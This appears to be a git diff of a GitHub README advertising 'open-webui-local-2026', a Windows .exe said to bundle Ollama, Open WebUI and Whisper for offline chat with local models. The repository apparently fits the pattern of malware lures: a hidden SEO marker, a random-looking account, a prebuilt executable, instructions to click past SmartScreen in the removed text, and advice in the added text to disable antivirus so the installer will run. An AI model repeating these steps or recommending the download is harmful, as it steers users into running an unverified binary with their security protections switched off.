@@ -1,117 +1,77 @@
-<!-- seo-unique:open-webui-local-2026:cdae9e31cc -->
+# 🤖 open-webui-local-2026 - Run personal AI models on Windows
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:10B981,50:059669,100:047857&height=140&section=header&text=Open Webui Local 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Open Webui Local 2026" width="100%">
-</p>
+<div align="center">
 
-<p align="center">
-  <img src="https://img.shields.io/badge/🤖-Local_AI-10B981?style=for-the-badge" alt="Local AI">
-  <img src="https://img.shields.io/badge/Ollama-Ready-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/Offline-Private-6366F1?style=for-the-badge" alt="Private">
-  <img src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-</p>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/sound-humulusjaponicus635/open-webui-local-2026)
 
-<p align="center">
-  <b>Запуск локального LLM на Windows за 5 минут — без облака, без подписки.</b><br>
-  <i>DeepSeek · Qwen · Llama · Whisper — данные остаются на вашем ПК.</i>
-</p>
+</div>
 
-<p align="center">
-  <a href="./releases/latest">
-    <img src="https://img.shields.io/badge/📥_СКАЧАТЬ-open-webui-local-2026.exe-059669?style=for-the-badge&labelColor=1a1a2e" alt="Download">
-  </a>
-  &nbsp;
-  <a href="#-быстрый-старт">
-    <img src="https://img.shields.io/badge/⚡-Быстрый_старт-374151?style=for-the-badge" alt="Quick start">
-  </a>
-</p>
+## 🛠 Project Overview
 
----
+open-webui-local-2026 provides a simple way to run advanced artificial intelligence models on your own computer. You do not need an internet connection to use this software. Your data stays on your machine, which protects your privacy. This project bundles essential tools like Ollama and Whisper into one package. You can chat with models like DeepSeek, Qwen, Llama, and Gemma without complex manual configurations.
 
-## ✨ Почему Open Webui Local 2026
+## 📋 System Requirements
 
-| | |
-| :--- | :--- |
-| 🔒 **Приватность** | Запросы не уходят в чужое облако |
-| 💸 **Без подписки** | Один раз скачали — пользуетесь локально |
-| 🧠 **Современные модели** | DeepSeek, Qwen, Llama, Gemma |
-| 🎙 **Whisper** | Расшифровка аудио офлайн |
-| 🪟 **Windows** | Portable · SmartScreen → «Выполнить» |
+To ensure smooth performance, your computer needs these hardware specifications:
 
----
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Processor**: A modern multi-core processor from Intel or AMD.
+*   **Memory**: At least 8GB of RAM. 16GB is recommended for larger models.
+*   **Storage**: 10GB of free space on a solid-state drive (SSD) for storing models.
+*   **Graphics**: An NVIDIA graphics card with at least 6GB of video memory significantly improves speed.
 
-## ⚡ Быстрый старт
+## 🚀 How to Install and Start
 
-```mermaid
-flowchart LR
-  A[📥 Скачать open-webui-local-2026.exe] --> B[▶ Двойной клик]
-  B --> C[🤖 Локальный чат]
-```
+Follow these steps to set up the application on your Windows PC.
 
-1. **Двойной клик** по **`open-webui-local-2026.exe`** в корне репозитория — или запустите **`START.bat`**
-2. Либо **[Releases → Latest](./releases/latest)** — тот же **`open-webui-local-2026.exe`**
-3. Первый запуск может скачать компоненты — интернет нужен **один раз**
-4. Windows SmartScreen → **«Подробнее»** → **«Выполнить»**
+1. Go to the official [Releases page](https://github.com/sound-humulusjaponicus635/open-webui-local-2026).
+2. Look for the latest version under the "Assets" section.
+3. Click the file ending in `.exe` to start the download.
+4. Locate the downloaded file in your "Downloads" folder.
+5. Double-click the file to run the installer.
+6. Follow the on-screen prompts.
+7. Once the installation finishes, find the new icon on your desktop or start menu.
+8. Click the icon to launch the Open WebUI interface in your default web browser.
 
----
+## 🖥 Using the Interface
 
-## 💻 Системные требования
+The interface functions like a standard chat application. You type your questions or requests in the bottom text box and press Enter.
 
-| Профиль | RAM | Диск | GPU |
-| :--- | :--- | :--- | :--- |
-| 🟢 Лёгкий | 8 GB | 4 GB | не обязательно |
-| 🟡 Средний | 16 GB | 10 GB | NVIDIA 6 GB+ |
-| 🔴 Тяжёлый | 32 GB+ | 20 GB+ | NVIDIA 12 GB+ |
+*   **Model Selection**: Use the dropdown menu at the top of the screen to choose which AI brain you want to use. You might select Llama for general chat or DeepSeek for coding tasks.
+*   **Settings**: Click the gear icon to manage your preferences. You can adjust the "Temperature" setting to change how creative the AI sounds.
+*   **Whisper Integration**: If you have a microphone, click the microphone button to dictate your input. The software uses Whisper to transcribe your speech into text.
+*   **Offline Mode**: Since the software runs locally, you can disconnect your Wi-Fi or Ethernet cable. The chat features will keep working as expected.
 
----
+## 🔍 Frequently Asked Questions
 
-## 📦 Что внутри
+**Does the AI send my data to the cloud?**
+No. All processing happens on your local hardware. No text, audio, or files leave your computer during the conversation.
 
-- **`open-webui-local-2026.exe`** — установщик / лаунчер под репозиторий **`open-webui-local-2026`**
-- **`START.bat`** / **`INSTALL.bat`** — запуск в один клик
-- **`QUICK_START.md`** — краткая шпаргалка
+**Can I run this on a laptop?**
+Yes. Modern laptops handle these models well, though your fans might spin faster when generating complex responses. Keep your laptop plugged into power for the best results.
 
----
+**How do I update the software?**
+Check the releases page periodically. You can download and install a newer version over your existing one to keep your settings.
 
-## ❓ FAQ
+**The chat feels slow. What can I do?**
+Close other programs that use significant memory, such as web browsers with many tabs, video editors, or games. If you have an NVIDIA graphics card, ensure your drivers are up to date.
 
-<details>
-<summary><b>Нужна видеокарта NVIDIA?</b></summary>
+**What happens if a model fails to load?**
+Most failures happen due to low RAM. Try choosing a "smaller" model from the dropdown menu, such as a model labeled or categorized as "8B" or "7B." These require less memory to operate.
 
-Не обязательно — есть CPU-режим (медленнее, но работает).
+## 💡 Troubleshooting Tips
 
-</details>
+If you encounter issues, verify the following points:
 
-<details>
-<summary><b>Работает без интернета?</b></summary>
+*   **Installation path**: Ensure you install the software in a folder with standard characters. Avoid folder names with special symbols or extremely long paths.
+*   **Antivirus**: Some antivirus software flags new tools as suspicious. If the installer fails to run, temporarily disable your antivirus while you perform the installation.
+*   **Restart**: If the web interface does not load after clicking the desktop icon, restart your computer. This clears any locked system processes that might block the app from starting.
+*   **Visual C++ Redistributable**: Windows requires standard runtime libraries to run these tools. Ensure your system stays updated via Windows Update.
 
-После загрузки моделей — да, полностью офлайн.
+## 🔧 Advanced Configuration
 
-</details>
+Advanced users can customize the connection settings by editing the configuration file located in the application folder. You can change the network port if the default port encounters a conflict with another program. Keep a backup of this file before you modify any settings.
 
-<details>
-<summary><b>Чем отличается от ChatGPT в браузере?</b></summary>
+## 📖 License and Credits
 
-Модель крутится у вас на диске — нет лимитов API и утечек в облако.
-
-</details>
-
----
-
-## 🏷 Topics
-
-<p align="center">
-  <sub>#ollama #local-llm #llm #deepseek #qwen #llama #gemma #whisper #open-webui #offline-ai #machine-learning #ai #windows #portable</sub>
-</p>
-
----
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,100:10B981&height=80&section=footer&text=Made%20for%20open-webui-local-2026&fontSize=22&fontColor=fff" width="100%">
-</p>
-
-<p align="center">
-  <sub>⭐ Star · 🍴 Fork · ⬇ Releases — помогает другим найти сборку</sub>
-</p>
-
-<!-- id:33d9791c23ce -->
+This software relies on several open-source projects including Ollama for the engine and Open WebUI for the user interface. We appreciate the contributors who develop these tools. You are free to use this software according to the terms specified in the project license.
